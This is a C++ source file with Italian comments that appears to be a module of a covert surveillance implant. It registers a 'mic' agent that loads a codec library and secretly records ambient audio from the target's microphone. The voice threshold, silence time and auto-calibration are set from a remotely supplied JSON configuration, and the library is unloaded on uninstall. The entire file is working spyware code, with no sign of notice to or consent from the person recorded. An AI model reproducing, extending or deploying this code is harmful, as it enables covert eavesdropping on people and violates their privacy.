#include "HM_MicAgent/QAmbientalMicrophone.h"

HMODULE amb_codec_handle = NULL; // Handle alla dll del codec
BOOL bPM_AmbMicStarted = FALSE; // Flag che indica se il monitor e' attivo o meno

#define DEF_VOICE_TSLD 220 // Soglia della voce
#define DEF_SILENCE_TIME 1 // Numero di chunk da 5 secondi di silenzio
#define DEF_MIC_CALIBRATION FALSE // Calibrazione micforno

UINT amb_mic_voice_tsld = DEF_VOICE_TSLD;
INT amb_mic_silence_time = DEF_SILENCE_TIME;
BOOL  amb_mic_calibration = DEF_MIC_CALIBRATION;

DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
{
	char codec_path[DLLNAMELEN];
	static QAmbientalMicrophone *AmbMicObj = NULL;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_AmbMicStarted == bStartFlag)
		return 0;

	bPM_AmbMicStarted = bStartFlag;

	if (bStartFlag) {
		// Cerca di caricare il codec
		if (!amb_codec_handle)
			amb_codec_handle = 	LoadLibrary(HM_CompletePath(H4_CODEC_NAME, codec_path));

		// ...e inizia a registrare
		AmbMicObj = new QAmbientalMicrophone(amb_codec_handle, amb_mic_calibration, amb_mic_voice_tsld, amb_mic_silence_time);
	} else {
		// Finisce la registrazione e dealloca le strutture
		if (AmbMicObj) {
			delete AmbMicObj;
			AmbMicObj = NULL;
		}
	}

	return 1;
}

DWORD __stdcall PM_AmbMicInit(JSONObject elem)
{
	amb_mic_voice_tsld = (DWORD) (elem[L"threshold"]->AsNumber() * 1000);
	amb_mic_silence_time = (DWORD) elem[L"silence"]->AsNumber();
	amb_mic_silence_time /= 5; // E' in blocchi da 5 secondi
	amb_mic_calibration = (BOOL) elem[L"autosense"]->AsBool();

	return 1;
}

DWORD __stdcall PM_AmbMicUnregister()
{
#define MAX_FREE_TRIES 5
#define FREE_SLEEP_TIME 100
	DWORD i;
	if (amb_codec_handle) {
		// Cerca a tutti i costi di chiudere la libreria
		// (anche se dovrebbe riuscire al primo tentativo)
		for (i=0; i<MAX_FREE_TRIES; i++) {
			// Non ci sono race sulla libreria visto che il thread e' morto
			// dopo la delete dello Stop, e la Start (dove
			// carica la libreria) viene sempre eseguita da una action (cosi' 
			// come la unregister che e' esguita dall'action uninstall).
			if (FreeLibrary(amb_codec_handle))
				break;
			Sleep(FREE_SLEEP_TIME);
		}
		amb_codec_handle = NULL;
	}
	return 1;
}


void PM_AmbMicRegister()
{
	AM_MonitorRegister(L"mic", PM_AMBMICAGENT, NULL, (BYTE *)PM_AmbMicStartStop, (BYTE *)PM_AmbMicInit, (BYTE *)PM_AmbMicUnregister);
}